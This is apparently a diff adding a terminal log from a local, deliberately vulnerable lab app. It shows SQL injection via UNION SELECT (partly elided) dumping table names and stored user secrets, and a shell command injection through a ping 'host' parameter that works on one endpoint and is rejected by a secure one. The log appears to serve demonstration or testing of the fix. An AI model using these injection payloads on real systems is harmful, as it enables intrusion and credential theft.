@@ -1,0 +1,48 @@
+$ curl -sG "http://127.0.0.1:8102/api/search" --data-urlencode "q=Miku" | jq ".mode, (.results[] | {id,title,author_username})"
+"vulnerable (concatenated)"
+{
+  "id": 1,
+  "title": "Miku Expo setlist notes",
+  "author_username": "admin"
+}
+
+$ curl -sG "http://127.0.0.1:8102/api/search" --data-urlencode "q=zz' UNION SELECT ... database map ... --" | jq ".results[0]"
+{
+  "id": 9000,
+  "title": "[curl intel] database map",
+  "post_content": "users=2 tables=blog, sqlite_sequence, users, comments",
+  "published": 1,
+  "author_username": "curl-probe"
+}
+
+$ curl -sG "http://127.0.0.1:8102/api/search" --data-urlencode "q=zz' UNION SELECT ... users ... --" | jq ".results[] | {title,post_content}"
+{
+  "title": "[user] admin",
+  "post_content": "role=admin email=admin@example.com secret=admin"
+}
+{
+  "title": "[user] user1",
+  "post_content": "role=user email=user1@example.com secret=user1pass"
+}
+
+$ curl -i -sG "http://127.0.0.1:8102/api/ping-vulnerable" --data-urlencode "host=127.0.0.1; printf BAI_CHAIN_MARKER; uname -s"
+HTTP/1.1 200 OK
+Content-Type: text/plain; charset=utf-8
+Date: Sat, 30 May 2026 03:56:16 GMT
+Content-Length: 278
+
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=21.207 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 packets received, 0.0% packet loss
+round-trip min/avg/max/stddev = 21.207/21.207/21.207/nan ms
+BAI_CHAIN_MARKERDarwin
+
+$ curl -i -sG "http://127.0.0.1:8102/api/ping-secure" --data-urlencode "host=127.0.0.1; printf BAI_CHAIN_MARKER; uname -s"
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+Date: Sat, 30 May 2026 03:56:16 GMT
+Content-Length: 124
+
+{"detail":"shell metacharacters (;, \u0026, |, $, `, etc.) are rejected","error":"invalid host: only [a-zA-Z0-9.-] allowed"}
